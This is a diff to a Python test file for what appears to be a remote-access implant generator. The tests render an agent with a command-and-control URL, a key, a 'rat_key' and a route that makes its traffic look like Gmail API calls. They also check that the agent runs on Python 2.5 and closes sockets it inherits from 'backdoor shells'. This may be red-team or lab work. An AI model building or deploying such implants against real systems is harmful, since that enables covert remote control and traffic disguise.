@@ -28,7 +28,7 @@ def test_client_id_derivation() -> None:
 
 def test_template_renders_without_tokens() -> None:
     """Rendered agents carry config, never raw placeholders."""
-    text = agent.build_agent("http://192.168.1.120:8080", "msf-172-17-0-2", "ab" * 32, route="/gmail/v1/users/")
+    text = agent.build_agent("http://192.168.1.120:8080", "msf-172-17-0-2", "ab" * 32, rat_key="cd" * 32, route="/gmail/v1/users/")
     assert "{C2}" not in text and "{KEY}" not in text and "{ID}" not in text
     assert "http://192.168.1.120:8080" in text and "msf-172-17-0-2" in text
     assert "ab" * 32 in text
@@ -50,7 +50,7 @@ def test_template_rejects_bad_inputs() -> None:
 
 def test_template_is_py25_safe() -> None:
     """The agent must avoid constructs missing from Python 2.5 stdlib."""
-    text = agent.build_agent("http://127.0.0.1:8080", "lab-1", "ab" * 32)
+    text = agent.build_agent("http://127.0.0.1:8080", "lab-1", "ab" * 32, rat_key="cd" * 32)
     assert "timeout=" not in text, "py2.5 urllib/httplib lack timeout kwargs"
     assert " except " in text and ", e:" in text
     assert " as e" not in text.replace("has ", ""), "py2.5 lacks 'except as'"
@@ -59,7 +59,7 @@ def test_template_is_py25_safe() -> None:
 
 def test_template_drops_inherited_fds() -> None:
     """Agents born in backdoor shells must not hold the listen socket."""
-    text = agent.build_agent("http://127.0.0.1:8080", "lab-1", "ab" * 32)
+    text = agent.build_agent("http://127.0.0.1:8080", "lab-1", "ab" * 32, rat_key="cd" * 32)
     assert "closerange" not in text, "os.closerange is missing on python2.5"
     assert "range(3, 256)" in text and "os.close(_fd)" in text
     assert '"""' not in text, "triple quotes would terminate the module template string"
